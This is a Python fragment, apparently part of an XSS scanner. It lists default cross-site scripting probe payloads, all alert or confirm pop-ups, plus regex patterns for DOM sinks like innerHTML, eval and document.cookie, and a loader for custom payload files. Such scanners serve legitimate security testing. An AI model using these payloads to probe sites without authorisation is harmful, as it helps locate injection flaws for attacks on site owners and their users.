DEFAULT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '\\"><svg/onload=alert(1)>',
    "<body onload=alert(1)>",
    "'><script>confirm(1)</script>",
    "javascript:alert(1)",
    "><svg/onload=alert(1)>",
]

DOM_SINKS = [
    r"innerHTML",
    r"document\.write",
    r"eval",
    r"setTimeout",
    r"setInterval",
    r"Function",
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"window\.name",
    r"document\.cookie"
]

def load_payloads(payload_file):
    if payload_file:
        try:
            with open(payload_file, "r", encoding="utf-8") as f:
                payloads = [line.strip() for line in f if line.strip()]
            if not payloads:
                print("[!] Payload file is empty. Using default payloads.")
                return DEFAULT_PAYLOADS
            return payloads
        except Exception as e:
            print(f"[!] Failed to load payload file: {e}")
            print("[!] Using default payloads.")
            return DEFAULT_PAYLOADS
    else:
        print("[i] No payload file provided. Using default payloads...")
        return DEFAULT_PAYLOADS
